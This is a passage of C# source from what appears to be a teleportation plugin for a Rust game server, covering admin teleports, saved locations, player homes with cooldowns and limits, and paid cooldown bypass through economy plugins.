                        PrintMsgL(player, "CantTeleportPlayerToSelf");
                        return;
                    }
                    Teleport(origin, target);
                    PrintMsgL(player, "AdminTPPlayers", origin.displayName, target.displayName);
                    PrintMsgL(origin, "AdminTPPlayer", player.displayName, target.displayName);
                    if (config.Admin.AnnounceTeleportToTarget)
                        PrintMsgL(target, "AdminTPPlayerTarget", player.displayName, origin.displayName);
                    Puts(_("LogTeleportPlayer", null, player.displayName, origin.displayName, target.displayName));
                    break;
                case 3:
                    if (!float.TryParse(args[0].Replace(",", string.Empty), out x) || !float.TryParse(args[1].Replace(",", string.Empty), out y) || !float.TryParse(args[2], out z))
                    {
                        PrintMsgL(player, "InvalidCoordinates");
                        return;
                    }
                    if (config.Settings.CheckBoundaries && !CheckBoundaries(x, y, z)) // added this option because I HATE boundaries
                    {
                        PrintMsgL(player, "AdminTPOutOfBounds");
                        PrintMsgL(player, "AdminTPBoundaries", boundary);
                        return;
                    }
                    Teleport(player, x, y, z);
                    PrintMsgL(player, "AdminTPCoordinates", player.transform.position);
                    Puts(_("LogTeleport", null, player.displayName, player.transform.position));
                    break;
                case 4:
                    target = FindPlayersSingle(args[0], player);
                    if (target == null) return;
                    if (!float.TryParse(args[1].Replace(",", string.Empty), out x) || !float.TryParse(args[2].Replace(",", string.Empty), out y) || !float.TryParse(args[3], out z))
                    {
                        PrintMsgL(player, "InvalidCoordinates");
                        return;
                    }
                    if (!CheckBoundaries(x, y, z))
                    {
                        PrintMsgL(player, "AdminTPOutOfBounds");
                        PrintMsgL(player, "AdminTPBoundaries", boundary);
                        return;
                    }
                    Teleport(target, x, y, z);
                    if (player == target)
                    {
                        PrintMsgL(player, "AdminTPCoordinates", player.transform.position);
                        Puts(_("LogTeleport", null, player.displayName, player.transform.position));
                    }
                    else
                    {
                        PrintMsgL(player, "AdminTPTargetCoordinates", target.displayName, player.transform.position);
                        if (config.Admin.AnnounceTeleportToTarget)
                            PrintMsgL(target, "AdminTPTargetCoordinatesTarget", player.displayName, player.transform.position);
                        Puts(_("LogTeleportPlayer", null, player.displayName, target.displayName, player.transform.position));
                    }
                    break;
                default:
                    PrintMsgL(player, "SyntaxCommandTP");
                    break;
            }
        }

        private void CommandTeleportNear(IPlayer user, string command, string[] args)
        {
            if (DisabledCommandData.DisabledCommands.Contains(command.ToLower())) { user.Reply("Disabled command: " + command); return; }
            var player = user.Object as BasePlayer;
            if (!player || !IsAllowedMsg(player, PermTpN) || !player.IsConnected || player.IsSleeping()) return;
            switch (args.Length)
            {
                case 1:
                case 2:
                    var target = FindPlayersSingle(args[0], player);
                    if (target == null) return;
                    if (target == player)
                    {
#if DEBUG
                        Puts("Debug mode - allowing self teleport.");
#else
                        PrintMsgL(player, "CantTeleportToSelf");
                        return;
#endif
                    }
                    int distance = 0;
                    if (args.Length != 2 || !int.TryParse(args[1], out distance))
                        distance = config.Admin.TeleportNearDefaultDistance;
                    float x = UnityEngine.Random.Range(-distance, distance);
                    var z = (float)Math.Sqrt(Math.Pow(distance, 2) - Math.Pow(x, 2));
                    var destination = target.transform.position;
                    destination.x -= x;
                    destination.z -= z;
                    Teleport(player, GetGroundBuilding(destination), true);
                    PrintMsgL(player, "AdminTP", target.displayName);
                    Puts(_("LogTeleport", null, player.displayName, target.displayName));
                    if (config.Admin.AnnounceTeleportToTarget)
                        PrintMsgL(target, "AdminTPTarget", player.displayName);
                    break;
                default:
                    PrintMsgL(player, "SyntaxCommandTPN");
                    break;
            }
        }

        private void CommandTeleportLocation(IPlayer user, string command, string[] args)
        {
            if (DisabledCommandData.DisabledCommands.Contains(command.ToLower())) { user.Reply("Disabled command: " + command); return; }
            var player = user.Object as BasePlayer;
            if (!player || !IsAllowedMsg(player, PermTpL) || !player.IsConnected || player.IsSleeping()) return;
            AdminData adminData;
            if (!_Admin.TryGetValue(player.userID, out adminData) || adminData.Locations.Count <= 0)
            {
                PrintMsgL(player, "AdminLocationListEmpty");
                return;
            }
            switch (args.Length)
            {
                case 0:
                    PrintMsgL(player, "AdminLocationList");
                    foreach (var location in adminData.Locations)
                        PrintMsgL(player, $"{location.Key} {location.Value}");
                    break;
                case 1:
                    Vector3 loc;
                    if (!adminData.Locations.TryGetValue(args[0], out loc))
                    {
                        PrintMsgL(player, "LocationNotFound");
                        return;
                    }
                    Teleport(player, loc, true);
                    PrintMsgL(player, "AdminTPLocation", args[0]);
                    break;
                default:
                    PrintMsgL(player, "SyntaxCommandTPL");
                    break;
            }
        }

        private void CommandSaveTeleportLocation(IPlayer user, string command, string[] args)
        {
            if (DisabledCommandData.DisabledCommands.Contains(command.ToLower())) { user.Reply("Disabled command: " + command); return; }
            var player = user.Object as BasePlayer;
            if (!player || !IsAllowedMsg(player, PermTpSave) || !player.IsConnected || player.IsSleeping()) return;
            if (args.Length != 1)
            {
                PrintMsgL(player, "SyntaxCommandTPSave");
                return;
            }
            AdminData adminData;
            if (!_Admin.TryGetValue(player.userID, out adminData))
                _Admin[player.userID] = adminData = new AdminData();
            Vector3 location;
            if (adminData.Locations.TryGetValue(args[0], out location))
            {
                PrintMsgL(player, "LocationExists", location);
                return;
            }
            var positionCoordinates = player.transform.position;
            foreach (var loc in adminData.Locations)
            {
                if ((positionCoordinates - loc.Value).magnitude < config.Admin.LocationRadius)
                {
                    PrintMsgL(player, "LocationExistsNearby", loc.Key);
                    return;
                }
            }
            adminData.Locations[args[0]] = positionCoordinates;
            PrintMsgL(player, "AdminTPLocationSave");
            changedAdmin = true;
        }

        private void CommandRemoveTeleportLocation(IPlayer user, string command, string[] args)
        {
            if (DisabledCommandData.DisabledCommands.Contains(command.ToLower())) { user.Reply("Disabled command: " + command); return; }
            var player = user.Object as BasePlayer;
            if (!player || !IsAllowedMsg(player, PermTpRemove) || !player.IsConnected || player.IsSleeping()) return;
            if (args.Length != 1)
            {
                PrintMsgL(player, "SyntaxCommandTPRemove");
                return;
            }
            AdminData adminData;
            if (!_Admin.TryGetValue(player.userID, out adminData) || adminData.Locations.Count <= 0)
            {
                PrintMsgL(player, "AdminLocationListEmpty");
                return;
            }
            if (adminData.Locations.Remove(args[0]))
            {
                PrintMsgL(player, "AdminTPLocationRemove", args[0]);
                changedAdmin = true;
                return;
            }
            PrintMsgL(player, "LocationNotFound");
        }

        private void CommandTeleportBack(IPlayer user, string command, string[] args)
        {
            if (DisabledCommandData.DisabledCommands.Contains(command.ToLower())) { user.Reply("Disabled command: " + command); return; }
            var player = user.Object as BasePlayer;
            if (!player || !IsAllowedMsg(player, PermTpB) || !player.IsConnected || player.IsSleeping()) return;
            if (args.Length != 0)
            {
                PrintMsgL(player, "SyntaxCommandTPB");
                return;
            }
            AdminData adminData;
            if (!_Admin.TryGetValue(player.userID, out adminData) || adminData.PreviousLocation == Vector3.zero)
            {
                PrintMsgL(player, "NoPreviousLocationSaved");
                return;
            }

            Teleport(player, adminData.PreviousLocation, false);
            adminData.PreviousLocation = Vector3.zero;
            changedAdmin = true;
            PrintMsgL(player, "AdminTPBack");
            Puts(_("LogTeleportBack", null, player.displayName));
        }

        private void CommandSetHome(IPlayer user, string command, string[] args)
        {
            if (DisabledCommandData.DisabledCommands.Contains(command.ToLower())) { user.Reply("Disabled command: " + command); return; }
            var player = user.Object as BasePlayer;
            if (!player || !IsAllowed(player, PermHome) || !player.IsConnected || player.IsSleeping()) return;
            if (!config.Settings.HomesEnabled) { user.Reply("Homes are not enabled in the config."); return; }
            if (args.Length != 1)
            {
                PrintMsgL(player, "SyntaxCommandSetHome");
                return;
            }
            var err = CheckPlayer(player, false, CanCraftHome(player), true, "sethome");
            if (err != null)
            {
                PrintMsgL(player, err);
                return;
            }
            if (!player.CanBuild())
            {
                PrintMsgL(player, "HomeTPBuildingBlocked");
                return;
            }
            if (!args[0].All(char.IsLetterOrDigit))
            {
                PrintMsgL(player, "InvalidCharacter");
                return;
            }
            HomeData homeData;
            if (!_Home.TryGetValue(player.userID, out homeData))
                _Home[player.userID] = homeData = new HomeData();
            var limit = GetHigher(player, config.Home.VIPHomesLimits, config.Home.HomesLimit, true);
            if (limit > 0 && homeData.Locations.Count >= limit)
            {
                PrintMsgL(player, "HomeMaxLocations", limit);
                return;
            }
            Vector3 location;
            if (homeData.Locations.TryGetValue(args[0], out location))
            {
                PrintMsgL(player, "HomeExists", location);
                return;
            }
            var positionCoordinates = player.transform.position;
            foreach (var loc in homeData.Locations)
            {
                if ((positionCoordinates - loc.Value).magnitude < config.Home.LocationRadius)
                {
                    PrintMsgL(player, "HomeExistsNearby", loc.Key);
                    return;
                }
            }
            err = CanPlayerTeleport(player, positionCoordinates);
            if (err != null)
            {
                SendReply(player, err);
                return;
            }

            if (player.IsAdmin && config.Settings.DrawHomeSphere) player.SendConsoleCommand("ddraw.sphere", 30f, Color.blue, GetGround(positionCoordinates), 2.5f);

            err = CheckFoundation(player.userID, positionCoordinates);
            if (err != null)
            {
                PrintMsgL(player, err);
                return;
            }
            err = CheckInsideEntity(positionCoordinates);
            if (err != null)
            {
                PrintMsgL(player, err);
                return;
            }
            homeData.Locations[args[0]] = positionCoordinates;
            changedHome = true;
            PrintMsgL(player, "HomeSave");
            PrintMsgL(player, "HomeQuota", homeData.Locations.Count, limit);
        }

        private void CommandRemoveHome(IPlayer user, string command, string[] args)
        {
            if (DisabledCommandData.DisabledCommands.Contains(command.ToLower())) { user.Reply("Disabled command: " + command); return; }
            if (!config.Settings.HomesEnabled) { user.Reply("Homes are not enabled in the config."); return; }
            var player = user.Object as BasePlayer;
            if (!player || !IsAllowed(player, PermHome) || !player.IsConnected || player.IsSleeping()) return;
            if (player.IsAdmin && args.Length == 2 && args[0] == "all")
            {
                float radius;
                if (float.TryParse(args[1], out radius))
                {
                    int amount = 0;
                    foreach (var home in _Home.ToList())
                    {
                        foreach (var location in home.Value.Locations.ToList())
                        {
                            if (Vector3Ex.Distance2D(location.Value, player.transform.position) < radius)
                            {
                                string username = covalence.Players.FindPlayerById(home.Key.ToString())?.Name ?? "N/A";
                                Puts("{0} ({1}) removed home from {2} ({3}) at {4}", player.displayName, player.userID, username, home.Key, location.Value);
                                player.SendConsoleCommand("ddraw.text", 30f, Color.red, location.Value, "X");
                                home.Value.Locations.Remove(location.Key);
                                amount++;
                            }
                        }
                    }

                    user.Reply($"Removed {amount} homes within {radius} meters");
                }
                else user.Reply("/removehome all <radius>");

                return;
            }
            if (args.Length != 1)
            {
                PrintMsgL(player, "SyntaxCommandRemoveHome");
                return;
            }
            HomeData homeData;
            if (!_Home.TryGetValue(player.userID, out homeData) || homeData.Locations.Count <= 0)
            {
                PrintMsgL(player, "HomeListEmpty");
                return;
            }
            if (homeData.Locations.Remove(args[0]))
            {
                changedHome = true;
                PrintMsgL(player, "HomeRemove", args[0]);
            }
            else
                PrintMsgL(player, "HomeNotFound");
        }

        private void CommandHome(IPlayer user, string command, string[] args)
        {
            if (DisabledCommandData.DisabledCommands.Contains(command.ToLower())) { user.Reply("Disabled command: " + command); return; }
            if (!config.Settings.HomesEnabled) { user.Reply("Homes are not enabled in the config."); return; }
            var player = user.Object as BasePlayer;
            if (!player || !IsAllowed(player, PermHome) || !player.IsConnected || player.IsSleeping()) return;
            if (args.Length == 0)
            {
                PrintMsgL(player, "SyntaxCommandHome");
                if (IsAllowed(player)) PrintMsgL(player, "SyntaxCommandHomeAdmin");
                return;
            }
            switch (args[0].ToLower())
            {
                case "add":
                    CommandSetHome(user, command, args.Skip(1).ToArray());
                    break;
                case "list":
                    CommandListHomes(user, command, args.Skip(1).ToArray());
                    break;
                case "remove":
                    CommandRemoveHome(user, command, args.Skip(1).ToArray());
                    break;
                case "radius":
                    CommandHomeRadius(user, command, args.Skip(1).ToArray());
                    break;
                case "delete":
                    CommandHomeDelete(user, command, args.Skip(1).ToArray());
                    break;
                case "tp":
                    CommandHomeAdminTP(user, command, args.Skip(1).ToArray());
                    break;
                case "homes":
                    CommandHomeHomes(user, command, args.Skip(1).ToArray());
                    break;
                case "wipe":
                    CommandWipeHomes(user, command, args.Skip(1).ToArray());
                    break;
                default:
                    cmdChatHomeTP(player, command, args);
                    break;
            }
        }

        private void CommandHomeRadius(IPlayer user, string command, string[] args)
        {
            if (DisabledCommandData.DisabledCommands.Contains(command.ToLower())) { user.Reply("Disabled command: " + command); return; }
            var player = user.Object as BasePlayer;
            if (!player || !IsAllowedMsg(player, PermRadiusHome) || !player.IsConnected || player.IsSleeping()) return;
            float radius;
            if (args.Length != 1 || !float.TryParse(args[0], out radius)) radius = 10;
            var found = false;
            foreach (var homeData in _Home)
            {
                var toRemove = new List<string>();
                var target = RustCore.FindPlayerById(homeData.Key)?.displayName ?? homeData.Key.ToString();
                foreach (var location in homeData.Value.Locations)
                {
                    if ((player.transform.position - location.Value).magnitude <= radius)
                    {
                        if (CheckFoundation(homeData.Key, location.Value) != null)
                        {
                            PrintMsgL(player, "HomeRemovedInvalid", $"{location.Key} {location.Value}");
                            toRemove.Add(location.Key);
                            found = true;
                            continue;
                        }
                        var entity = GetFoundationOwned(location.Value, homeData.Key);
                        if (entity == null)
                        {
                            player.SendConsoleCommand("ddraw.text", 30f, Color.blue, location.Value, $"<size=20>{target} - {location.Key} {location.Value}</size>");
                        }
                        else
                        {
                            player.SendConsoleCommand("ddraw.text", 30f, Color.blue, entity.CenterPoint() + new Vector3(0, .5f), $"<size=20>{target} - {location.Key} {location.Value}</size>");
                            DrawBox(player, entity.CenterPoint(), entity.transform.rotation, entity.bounds.size);
                        }
                        PrintMsg(player, $"{target} - {location.Key} {location.Value}");
                        found = true;
                    }
                }
                foreach (var loc in toRemove)
                {
                    homeData.Value.Locations.Remove(loc);
                    changedHome = true;
                }
            }
            if (!found)
                PrintMsgL(player, "HomeNoFound");
        }

        private void CommandHomeDelete(IPlayer user, string command, string[] args)
        {
            if (DisabledCommandData.DisabledCommands.Contains(command.ToLower())) { user.Reply("Disabled command: " + command); return; }
            var player = user.Object as BasePlayer;
            if (!player || !IsAllowedMsg(player, PermDeleteHome) || !player.IsConnected || player.IsSleeping()) return;
            if (args.Length != 2)
            {
                PrintMsgL(player, "SyntaxCommandHomeDelete");
                return;
            }
            var userId = FindPlayersSingleId(args[0], player);
            if (userId <= 0) return;
            HomeData targetHome;
            if (!_Home.TryGetValue(userId, out targetHome) || !targetHome.Locations.Remove(args[1]))
            {
                PrintMsgL(player, "HomeNotFound");
                return;
            }
            changedHome = true;
            PrintMsgL(player, "HomeDelete", args[0], args[1]);
        }

        private void CommandHomeAdminTP(IPlayer user, string command, string[] args)
        {
            if (DisabledCommandData.DisabledCommands.Contains(command.ToLower())) { user.Reply("Disabled command: " + command); return; }
            var player = user.Object as BasePlayer;
            if (!player || !IsAllowedMsg(player, PermTpHome) || !player.IsConnected || player.IsSleeping()) return;
            if (args.Length != 2)
            {
                PrintMsgL(player, "SyntaxCommandHomeAdminTP");
                return;
            }
            var userId = FindPlayersSingleId(args[0], player);
            if (userId <= 0) return;
            HomeData targetHome;
            Vector3 location;
            if (!_Home.TryGetValue(userId, out targetHome) || !targetHome.Locations.TryGetValue(args[1], out location))
            {
                PrintMsgL(player, "HomeNotFound");
                return;
            }

            Teleport(player, location, true);
            PrintMsgL(player, "HomeAdminTP", args[0], args[1]);
        }

        // Check that plugins are available and enabled for CheckEconomy()
        private bool UseEconomy()
        {
            return (config.Settings.UseEconomics && Economics != null) || (config.Settings.UseServerRewards && ServerRewards != null);
        }

        // Check balance on multiple plugins and optionally withdraw money from the player
        private bool CheckEconomy(BasePlayer player, double bypass, bool withdraw = false, bool deposit = false)
        {
            if (player == null)
            {
                return false;
            }
            double balance;
            bool foundmoney = false;

            // Check Economics first.  If not in use or balance low, check ServerRewards below
            if (config.Settings.UseEconomics && Economics != null)
            {
                balance = (double)Economics?.CallHook("Balance", player.UserIDString);
                if (balance >= bypass)
                {
                    foundmoney = true;
                    if (withdraw)
                    {
                        return Convert.ToBoolean(Economics?.CallHook("Withdraw", player.userID, bypass));
                    }
                    else if (deposit)
                    {
                        Economics?.CallHook("Deposit", player.userID, bypass);
                    }
                }
            }

            // No money via Economics, or plugin not in use.  Try ServerRewards.
            if (!foundmoney && config.Settings.UseServerRewards && ServerRewards != null)
            {
                object bal = ServerRewards?.Call("CheckPoints", player.userID);
                balance = Convert.ToDouble(bal);
                if (balance >= bypass)
                {
                    foundmoney = true;
                    if (withdraw)
                    {
                        return Convert.ToBoolean(ServerRewards?.Call("TakePoints", player.userID, (int)bypass));
                    }
                    else if (deposit)
                    {
                        ServerRewards?.Call("AddPoints", player.userID, (int)bypass);
                    }
                }
            }

            // Just checking balance without withdrawal - did we find anything?
            return foundmoney;
        }

        private void cmdChatHomeTP(BasePlayer player, string command, string[] args)
        {
            if (DisabledCommandData.DisabledCommands.Contains(command.ToLower())) { player.ChatMessage("Disabled command."); return; }
            if (!IsAllowed(player, PermHome) || !player.IsConnected || player.IsSleeping()) return;
            bool paidmoney = false;
            if (!config.Settings.HomesEnabled) { player.ChatMessage("Homes are not enabled in the config."); return; }
            if (args.Length < 1)
            {
                PrintMsgL(player, "SyntaxCommandHome");
                return;
            }
            float globalCooldownTime = GetGlobalCooldown(player);
            if (globalCooldownTime > 0f)
            {
                PrintMsgL(player, "WaitGlobalCooldown", FormatTime(player, (int)globalCooldownTime));
                return;
            }
            if (config.Settings.BlockAuthorizedTeleporting && player.IsBuildingAuthed()) 
            {
                PrintMsgL(player, "CannotTeleportFromHome");
                return;
            }
            HomeData homeData;
            if (!_Home.TryGetValue(player.userID, out homeData) || homeData.Locations.Count <= 0)
            {
                PrintMsgL(player, "HomeListEmpty");
                return;
            }
            Vector3 location;
            if (!homeData.Locations.TryGetValue(args[0], out location))
            {
                PrintMsgL(player, "HomeNotFound");
                return;
            }
            var err = CheckPlayer(player, config.Home.UsableOutOfBuildingBlocked, CanCraftHome(player), true, "home");
            if (err != null)
            {
                PrintMsgL(player, err);
                return;
            }
            if (config.Settings.BlockNoEscape && Convert.ToBoolean(NoEscape?.Call("IsBlockedZone", location)))
            {
                PrintMsgL(player, "TPNoEscapeBlocked");
                return;
            }
            err = CheckFoundation(player.userID, location) ?? CheckTargetLocation(player, location, config.Home.UsableIntoBuildingBlocked, config.Home.CupOwnerAllowOnBuildingBlocked);
            if (err != null)
            {
                PrintMsgL(player, "HomeRemovedInvalid", args[0]);
                PrintMsgL(player, err);
                homeData.Locations.Remove(args[0]);
                changedHome = true;
                return;
            }
            err = CheckInsideEntity(location);
            if (err != null)
            {
                PrintMsgL(player, "HomeRemovedInsideBlock", args[0]);
                homeData.Locations.Remove(args[0]);
                changedHome = true;
                return;
            }
            var timestamp = Facepunch.Math.Epoch.Current;
            var currentDate = DateTime.Now.ToString("d");
            if (homeData.Teleports.Date != currentDate)
            {
                homeData.Teleports.Amount = 0;
                homeData.Teleports.Date = currentDate;
            }
            var cooldown = GetLower(player, config.Home.VIPCooldowns, config.Home.Cooldown);
            if (cooldown > 0 && timestamp - homeData.Teleports.Timestamp < cooldown)
            {
                var cmdSent = args.Length >= 2 ? args[1].ToLower() : string.Empty;

                if (!string.IsNullOrEmpty(config.Settings.BypassCMD) && !paidmoney)
                {
                    if (cmdSent == config.Settings.BypassCMD.ToLower() && config.Home.Bypass > -1)
                    {
                        bool foundmoney = CheckEconomy(player, config.Home.Bypass);

                        if (foundmoney)
                        {
                            CheckEconomy(player, config.Home.Bypass, true);
                            paidmoney = true;

                            if (config.Home.Bypass > 0)
                            {
                                PrintMsgL(player, "HomeTPCooldownBypass", config.Home.Bypass);
                            }

                            if (config.Home.Pay > 0)
                            {
                                PrintMsgL(player, "PayToHome", config.Home.Pay);
                            }
                        }
                        else
                        {
                            PrintMsgL(player, "HomeTPCooldownBypassF", config.Home.Bypass);
                            return;
                        }
                    }
                    else if (UseEconomy())
                    {
                        if (config.Home.Bypass > 0)
                        {
                            var remain = cooldown - (timestamp - homeData.Teleports.Timestamp);
                            PrintMsgL(player, "HomeTPCooldown", FormatTime(player, remain));
                            PrintMsgL(player, "HomeTPCooldownBypassP", config.Home.Bypass);
                            PrintMsgL(player, "HomeTPCooldownBypassP2", config.Settings.BypassCMD);
                            return;
                        }
                    }
                    else
                    {
                        var remain = cooldown - (timestamp - homeData.Teleports.Timestamp);

                        PrintMsgL(player, "HomeTPCooldown", FormatTime(player, remain));
                        return;
                    }
                }
                else
                {
                    var remain = cooldown - (timestamp - homeData.Teleports.Timestamp);
                    PrintMsgL(player, "HomeTPCooldown", FormatTime(player, remain));
                    return;
                }
            }
            var limit = GetHigher(player, config.Home.VIPDailyLimits, config.Home.DailyLimit, true);
            if (limit > 0 && homeData.Teleports.Amount >= limit)
            {
                PrintMsgL(player, "HomeTPLimitReached", limit);
                return;
            }
            if (TeleportTimers.ContainsKey(player.userID))
            {
                PrintMsgL(player, "TeleportPendingTPC");
                return;
            }
            err = CanPlayerTeleport(player, location);
            if (err != null)
            {
                SendReply(player, err);
                return;
            }
            err = CheckItems(player);
            if (err != null)
            {
                PrintMsgL(player, "TPBlockedItem", err);
                return;
            }
            if (config.Home.UsableFromSafeZoneOnly && !player.InSafeZone())
            {
                PrintMsgL(player, "TPHomeSafeZoneOnly");
                return;
            }
            var countdown = GetLower(player, config.Home.VIPCountdowns, config.Home.Countdown);
            TeleportTimers[player.userID] = new TeleportTimer
            {
                OriginPlayer = player,
                Timer = timer.Once(countdown, () =>
                {
#if DEBUG
                    Puts("Calling CheckPlayer from cmdChatHomeTP");
#endif
                    err = CheckPlayer(player, config.Home.UsableOutOfBuildingBlocked, CanCraftHome(player), true, "home");
                    if (err != null)
                    {
                        PrintMsgL(player, "Interrupted");
                        PrintMsgL(player, err);
                        if (paidmoney)
                        {
                            paidmoney = false;
                            CheckEconomy(player, config.Home.Bypass, false, true);
                        }
                        TeleportTimers.Remove(player.userID);
                        return;
                    }
                    err = CanPlayerTeleport(player, location);
                    if (err != null)
                    {
                        PrintMsgL(player, "Interrupted");
                        PrintMsgL(player, err);
                        if (paidmoney)
                        {
                            paidmoney = false;
                            CheckEconomy(player, config.Home.Bypass, false, true);
                        }
                        TeleportTimers.Remove(player.userID);
                        return;
                    }
                    err = CheckItems(player);
                    if (err != null)
                    {
                        PrintMsgL(player, "Interrupted");
                        PrintMsgL(player, "TPBlockedItem", err);
                        if (paidmoney)
                        {
                            paidmoney = false;
                            CheckEconomy(player, config.Home.Bypass, false, true);
                        }
                        TeleportTimers.Remove(player.userID);
                        return;
                    }
                    err = CheckFoundation(player.userID, location) ?? CheckTargetLocation(player, location, config.Home.UsableIntoBuildingBlocked, config.Home.CupOwnerAllowOnBuildingBlocked);
                    if (err != null)
                    {
                        PrintMsgL(player, "HomeRemovedInvalid", args[0]);
                        PrintMsgL(player, err);
                        homeData.Locations.Remove(args[0]);
                        changedHome = true;
                        if (paidmoney)
                        {
                            paidmoney = false;
                            CheckEconomy(player, config.Home.Bypass, false, true);
                        }
                        return;
                    }
                    err = CheckInsideEntity(location);
                    if (err != null)
                    {
                        PrintMsgL(player, "HomeRemovedInsideBlock", args[0]);
                        homeData.Locations.Remove(args[0]);
                        changedHome = true;
                        if (paidmoney)
                        {
                            paidmoney = false;
                            CheckEconomy(player, config.Home.Bypass, false, true);
                        }
                        return;
                    }

                    if (UseEconomy())
                    {
                        if (config.Home.Pay < 0)
                        {
                            TeleportTimers.Remove(player.userID);
                            PrintMsgL(player, "DM_TownTPDisabled", "/home");
                            return;
                        }
                        else if (config.Home.Pay > 0)
                        {
                            if (!CheckEconomy(player, config.Home.Pay))
                            {
                                TeleportTimers.Remove(player.userID);
                                PrintMsgL(player, "TPNoMoney", config.Home.Pay);
                                return;
                            }

                            if (!paidmoney)
                            {
                                PrintMsgL(player, "TPMoney", (double)config.Home.Pay);
                            }

                            paidmoney = CheckEconomy(player, config.Home.Pay, true);
                        }
                    }

                    Teleport(player, location, config.Home.AllowTPB);
                    homeData.Teleports.Amount++;
                    homeData.Teleports.Timestamp = timestamp;
                    changedHome = true;
                    PrintMsgL(player, "HomeTP", args[0]);
                    if (limit > 0) PrintMsgL(player, "HomeTPAmount", limit - homeData.Teleports.Amount);
                    TeleportTimers.Remove(player.userID);
                })
            };

            if (countdown > 0)
            {
                PrintMsgL(player, "HomeTPStarted", args[0], countdown);
            }
        }

        private void CommandListHomes(IPlayer user, string command, string[] args)
        {
            if (DisabledCommandData.DisabledCommands.Contains(command.ToLower())) { user.Reply("Disabled command: " + command); return; }
            var player = user.Object as BasePlayer;
            if (!player || !player.IsConnected || player.IsSleeping()) return;
            if (!config.Settings.HomesEnabled) { user.Reply("Homes are not enabled in the config."); return; }
            if (args.Length != 0)
            {
                PrintMsgL(player, "SyntaxCommandListHomes");
                return;
            }
            HomeData homeData;
            if (!_Home.TryGetValue(player.userID, out homeData) || homeData.Locations.Count <= 0)
            {
                PrintMsgL(player, "HomeListEmpty");
                return;
            }
            PrintMsgL(player, "HomeList");
            if (config.Home.CheckValidOnList)
            {
                var toRemove = new List<string>();
                foreach (var location in homeData.Locations)
                {
                    var err = CheckFoundation(player.userID, location.Value);
                    if (err != null)
                    {
                        PrintMsgL(player, err);
                        toRemove.Add(location.Key);
                        continue;
                    }
                    PrintMsgL(player, $"{location.Key} {location.Value}");
                }
                foreach (var loc in toRemove)
                {
                    PrintMsgL(player, "HomeRemovedInvalid", loc);
                    homeData.Locations.Remove(loc);
                    changedHome = true;
                }
                return;
            }
            foreach (var location in homeData.Locations)
                PrintMsgL(player, $"{location.Key} {location.Value}");
        }

        private void CommandHomeHomes(IPlayer user, string command, string[] args)
        {
            if (DisabledCommandData.DisabledCommands.Contains(command.ToLower())) { user.Reply("Disabled command: " + command); return; }
            var player = user.Object as BasePlayer;
            if (!player || !IsAllowedMsg(player, PermHomeHomes) || !player.IsConnected || player.IsSleeping()) return;
            if (args.Length != 1)
            {
                PrintMsgL(player, "SyntaxCommandHomeHomes");
                return;
            }
            var userId = FindPlayersSingleId(args[0], player);
            if (userId <= 0) return;
            HomeData homeData;
            if (!_Home.TryGetValue(userId, out homeData) || homeData.Locations.Count <= 0)
            {
                PrintMsgL(player, "HomeListEmpty");
                return;
            }
            PrintMsgL(player, "HomeList");
            var toRemove = new List<string>();
            foreach (var location in homeData.Locations)
            {
                var err = CheckFoundation(userId, location.Value);
                if (err != null)
                {
                    PrintMsgL(player, err);
                    toRemove.Add(location.Key);
                    continue;
                }
                PrintMsgL(player, $"{location.Key} {location.Value}");
            }
            foreach (var loc in toRemove)
            {
                PrintMsgL(player, "HomeRemovedInvalid", loc);
                homeData.Locations.Remove(loc);
                changedHome = true;
            }
        }

        private void CommandTeleportAcceptToggle(IPlayer user, string command, string[] args)
        {
            if (DisabledCommandData.DisabledCommands.Contains(command.ToLower())) { user.Reply("Disabled command: " + command); return; }
            var player = user.Object as BasePlayer;
            if (!player || !player.IsConnected || player.IsSleeping()) return;

            if (TPTToggle.Contains(player.UserIDString))
            {
                TPTToggle.Remove(player.UserIDString);
                PrintMsgL(player, "AcceptToggleOn");
            }
            else
            {
                TPTToggle.Add(player.UserIDString);
                PrintMsgL(player, "AcceptToggleOff");
            }

            changedTPT = true;
        }

        public bool IsOnSameTeam(ulong playerId, ulong targetId)
        {
            RelationshipManager.PlayerTeam team;
            return RelationshipManager.ServerInstance.playerToTeam.TryGetValue(playerId, out team) && team.members.Contains(targetId);
        }

        private bool AreFriends(string playerId, string targetId)
        {
            return Friends != null && Convert.ToBoolean(Friends?.Call("AreFriends", playerId, targetId));
        }

        private bool IsInSameClan(string playerId, string targetId)
        {
            return Clans != null && Convert.ToBoolean(Clans?.Call("IsMemberOrAlly", playerId, targetId));
        }

        private void OnTeleportRequested(BasePlayer target, BasePlayer player)
        {
            if (!permission.UserHasPermission(target.UserIDString, PermTpT) || !permission.UserHasPermission(player.UserIDString, PermTpT) || TPTToggle.Contains(target.UserIDString))
            {
                return;
            }

            if (config.TPT.UseClans && IsInSameClan(player.UserIDString, target.UserIDString))
            {
                target.SendConsoleCommand("chat.say /tpa");
            }
            else if (config.TPT.UseFriends && AreFriends(player.UserIDString, target.UserIDString))
            {
                target.SendConsoleCommand("chat.say /tpa");
            }
            else if (config.TPT.UseTeams && IsOnSameTeam(player.userID, target.userID))
            {
                target.SendConsoleCommand("chat.say /tpa");
            }
        }

        private string GetMultiplePlayers(List<BasePlayer> players)
        {
            var list = new List<string>();

            foreach (var player in players)
            {
                string id;
                if (!_players.TryGetValue(player, out id))
                {
                    id = OnPlayerConnected(player);
                }

                list.Add(string.Format("<color={0}>{1}</color> - {2}", config.Settings.ChatCommandArgumentColor, id, player.displayName));
            }

            return string.Join(", ", list.ToArray());
        }

        private void CommandTeleportRequest(IPlayer user, string command, string[] args)
        {
            if (DisabledCommandData.DisabledCommands.Contains(command.ToLower())) { user.Reply("Disabled command: " + command); return; }
            var player = user.Object as BasePlayer;
            if (!player || !IsAllowedMsg(player, PermTpR) || !player.IsConnected || player.IsSleeping()) return;
            if (!config.Settings.TPREnabled) { user.Reply("TPR is not enabled in the config."); return; }
            float globalCooldownTime = GetGlobalCooldown(player);
            if (globalCooldownTime > 0f)
            {
                PrintMsgL(player, "WaitGlobalCooldown", FormatTime(player, (int)globalCooldownTime));
                return;
            }
            if (config.Settings.BlockAuthorizedTeleporting && player.IsBuildingAuthed())
            {
                PrintMsgL(player, "CannotTeleportFromHome");
                return;
            }
            if (args.Length == 0)
            {
                PrintMsgL(player, "SyntaxCommandTPR");
                return;
            }
            var targets = FindPlayers(args[0]);
            if (targets.Count <= 0)
            {
                PrintMsgL(player, "PlayerNotFound");
                return;
            }
            BasePlayer target = null;
            if (args.Length >= 2)
            {
                if (targets.Count > 1)
                {
                    PrintMsgL(player, "MultiplePlayers", GetMultiplePlayers(targets));
                    return;
                }
                else target = targets[0];
            }
            else
            {
                if (targets.Count > 1)
                {
